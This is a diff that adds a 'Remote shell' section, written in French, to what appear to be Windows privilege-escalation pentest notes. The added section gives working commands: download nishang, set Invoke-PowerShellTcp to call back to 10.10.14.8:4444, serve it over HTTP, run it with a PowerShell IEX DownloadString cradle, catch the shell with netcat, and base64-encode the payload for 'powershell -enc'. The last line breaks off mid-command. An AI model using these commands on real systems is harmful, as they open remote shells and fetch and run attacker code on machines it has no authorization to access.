@@ -5,6 +5,34 @@
 Read : https://github.com/AlessandroZ/BeRoot/tree/master/Windows
 
 
+## Remote shell
+
+    https://github.com/samratashok/nishang
+
+    wget https://github.com/samratashok/nishang/archive/master.zip
+    unzip master.zip 
+    mv nishang-master/ /opt/nishang
+    cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+    mv Invoke-PowerShellTcp.ps1 reverse.ps1
+
+Editer avec vi, et coller à la fin:
+
+    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 4444
+
+    python -m simpleHTTPServer
+    powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8:8000/reverse.ps1')
+    nc -lvp 4444
+    
+Encoder base64
+
+    cat reverse.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
+    powershell -enc xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+    
+
+## Test l'accès au powershell
+
+    powershell -Command "$PSVersionTable.PSVersion"
+    powershell IEX (New-Object Net.WebClient).DownloadString(  
 
 ## Get System info
 ````
